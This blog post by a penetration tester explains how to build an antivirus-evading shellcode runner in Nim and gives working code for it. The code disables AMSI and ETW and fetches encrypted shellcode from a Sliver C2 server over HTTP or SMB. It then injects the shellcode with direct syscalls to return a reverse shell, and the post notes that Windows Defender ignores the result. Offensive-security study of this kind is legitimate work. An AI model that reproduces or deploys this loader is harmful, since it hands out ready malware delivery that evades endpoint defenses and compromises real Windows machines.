---
layout: post
title: "Offensive Nim"
permalink: "offensivenim"
date: 19-10-2023
categories: Blog
---

During some downtime in my pentesting recently, I have  tried to increase my knowledge of the tooling required to avoid AV. I had previously built a basic runner in C++ that incorporated syscalls to bypass Defender, but I was seeing some [videos](https://www.youtube.com/watch?v=vq6wNGYzdDE) by John Hammond explaining the powers of the programming language called Nim, so I wanted to give that a try next.

In recent years Nim has become the preferred choice of many Malware writers due to the fact that the syntax is Python like, yet it compiles executables or dll's very easily for Windows, so it can be an ideal choice for newbies.

This then lead me to the amazing Github repo by the creator of CrackMapExec, Byt3bl33d3r named [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim). For people like me who like to throw snippets of code together to customise their own tooling this is a gold mine.

The repo has lots of little snippets of Nim code doing everything from:

- Creating a keylogger
- Unhooking ntdll
- Bypassing AMSI
- Bypassing ETW
- Stealing tokens
- Shellcode Injection

and so on....I highly recommend having a look at the tools to familiarise yourself with Nim and how it can be used for Offensive purposes.

Armed with this information I installed the Nim compiler on a test Windows VM and got my development environment up and running in VS Code. Not to be confused with the IDE named Visual Studio.

At the beginning, when writing malware I was getting hung up on how unfamiliar the Win32 methods looked to me but once you realise that the key to a lot of Malware is injecting shellcode into memory using 4 methods it becomes easier to grasp.

The sequence normally goes like this:

1. OpenProcess: Get a handle to a remote process.
2. VirtualAllocEx: Change the state of a region of memory within the remote process.
3. WriteProcessMemory: Write data to the specified process.
4. CreateRemoteThread: Start a thread in the remote process.

The main catch in regards these methods is that they are well known to AV vendors and they also use ntdll.dll to access the kernel. These methods can get 'hooked' by AV solutions and their process flow redirected into the AV framework to be tested for any malware. If you would like some greater detail on this I can highly recommend the following [article](https://secarma.com/process-injection-part-2-modern-process-injection/) which I found relatively user friendly to read given the tricky subject matter.

Anyhow, to avoid this AV hooking you can use a technique called 'Syscalls'. Syscalls allow you to call the Native API instead of the Windows API which is normally where the hooks are created by the AV vendors.

So the methods used then become these native ones:

|*Windows API*       |*Native API*            | 
---------------------|------------------------|
|OpenProcess         |NtOpenProcess           |
|VirtualAllocEx      |NtAllocateVirtualMemory |
|WriteProcessMemory  |NtWriteVirtualMemory    | 
|CreateRemoteThread  |NtCreateThreadEx        |


### Coding - Main Module

I now wanted to put all of this to the test and cobble together a Nim shellcode runner to take some remote shellcode from Sliver C2 over http or smb, open a process, inject the shellcode into it and execute the thread to give me my reverse shell back to Sliver.

I started by creating my main module to read in the parameters from the command line, such as whether the payload is accessed via SMB or http, as well as things like the IP or port/share to receive the data.

I also have it decrypting the payload if it arrives encrypted by Sliver, but on speaking to others on the Bishop Fox repo, we think the encryption Sliver can do automatically currently may not be working so I was unable to verify if this works. The code removes the unrequired iv from the first 16 bytes of a Sliver payload then passes it to a decrypt function to decrypt the AES128 CBC encryption that it uses as default.

For now here is the main method created for my purposes:

{% highlight powershell %} 

when isMainModule:

        let key: seq[byte] = toByteSeq("KEYDEFGHIHKLOMNA")
        let iv:  seq[byte] = toByteSeq("IVCDEFGHIHKLOMNA")
        
        if(paramCount() > 0 and $paramStr(1) == "-h"):
            echo ("Usage: <SLIVER or CS or NONE encryption type> -m <MODE> <IP> <SHARE or PORT> <FILE_NAME>")
            echo ("Example: sliver -m smb  192.168.55.15 tools myfile.bin")
            echo ("Example: none   -m http 192.168.55.15 8080  myfile.bin")
            quit()
        
        antiEmulation()
    
        var amsiPatched = patchAMSI()
        echo "[patchAMSI] AMSI disabled: ", amsiPatched

        var etwPatched = patchETW()
        echo "[patchETW] ETW disabled: ", etwPatched

        var shellcode: seq[byte]
        var actual: seq[byte]

        #If no parameters passed use hardcoded http url from the code to be customised per network
        if (paramCount() == 0):    
            var client = newHttpClient()
            var url = 
            "http://10.90.248.103:80/test.bin"
            var response: string = client.getContent(url) 
            
            shellcode = toByteSeq(response)                 
            
            runShellcode(shellcode) 

        #Download the payload over http
        elif ($paramStr(3) == "http"):    
            var client = newHttpClient()
            var url = "http://" & $paramStr(4) & ":" & $paramStr(5) & "/" & $paramStr(6)
            var response: string = client.getContent(url) 
            shellcode = 
            toByteSeq(response)

            #If Sliver remove the iv from first 16 bytes
            if ($paramStr(1) == "sliver"):                 
                for i in 16  ..< shellcode.len:
                    actual.add(shellcode[i])
            
            shellcode = 
            decrypt(actual,key,iv)                   
            runShellcode(shellcode)      
        
        #Download the payload over smb  
        elif ($paramStr(3) == "smb"):
            let filename = "\\\\" & $paramStr(4) & "\\" & $paramStr(5) & "\\" & $paramStr(6)
            var file: FILE = open(filename, fmRead)
            var length = file.getFileSize()
            var shellcode = newSeq[byte](length)
            discard file.readBytes(shellcode, 0, length)
            
            #If Sliver remove the iv from first 16 bytes
            if ($paramStr(1) == "sliver"):                 
                for i in 16  ..< shellcode.len:
                    actual.add(shellcode[i])
                shellcode = decrypt(actual,key,iv)
            runShellcode(shellcode)
{% endhighlight %}

### Coding - Shellcode Running via Syscalls

Now that I have my shellcode received over the network from my main method, I needed to call the 4 methods mentioned earlier to get my Shellcode into memory. I created the runShellcode method as shown below which uses a GetSysCallStub module developed by Fabian aka [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/NimGetSyscallStub).

{% highlight powershell %} 
proc runShellcode(shellcode: seq[byte]): void =

    var SYSCALL_STUB_SIZE: int = 23;
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

    cid.UniqueProcess = GetCurrentProcessId()

    let cProcess = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, cProcess)

    let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)

    var syscallStub_NtAlloc:  HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtWrite:  HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # define NtOpenProcess
    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP));
    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtCreateThreadEx
    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate));
    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    var status: NTSTATUS
    var success: BOOL
    var bytesWritten: SIZE_T

    success = GetSyscallStub
    ("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
    success = GetSyscallStub
    ("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub
    ("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
    success = GetSyscallStub
    ("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));
    
    status = NtOpenProcess
    (&pHandle,PROCESS_ALL_ACCESS, &oa, &cid)
    status = NtAllocateVirtualMemory
    (pHandle, &ds, 0, &sc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
    status = NtWriteVirtualMemory
    (pHandle, ds, shellcode[0].addr, sc_size-1, addr bytesWritten);
    status = NtCreateThreadEx
    (&tHandle, THREAD_ALL_ACCESS, NULL, pHandle,ds, NULL, FALSE, 0, 0, 0, NULL);

    echo "Finished: Check for your shell after a few seconds"
    WaitForSingleObject(tHandle, -1)
    CloseHandle(tHandle)

    status = NtClose(tHandle)
    status = NtClose(pHandle)
{% endhighlight %}

You may notice that I am injecting into the current process by getting its ID like so: "let cProcess = GetCurrentProcessId()". This is because I found that injecting into something like Notepad I found was a massive red flag to Defender. So although I would get my connection back, as soon as I did something very basic with Sliver such as upload a file the session would be killed. 

I found this could be circumvented by just letting syscalls do its thing and creating a new process. I realise most EDR vendors would eat this indicator for breakfast but for evading Defender it was sufficient.

If you do want to try injection into say Notepad and run it without opening up, you could just change those lines to something like this:

{% highlight powershell %} 
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend()
    defer: tProcess.close()
    cid.UniqueProcess = tProcess.processID
{% endhighlight %}

I found that on creating an executable with the above code that Defender compeletely ignores it mainly due to the fact that the payload isn't stored within the exe but is downloaded over the wire. The use of syscalls upon injection also prevented any behavioural triggers by Defender during my testing.

The purpose of this post wasn't to release a fully fledged tool, but just to provide you with enough information about Nim to build your own shellcode runner too. 

It turns out that Nim is such a nice language to program in and allows you to build tools very quickly. Feel free to drop me a mail if you want any further information on any of this and I will be more than happy to provide it.






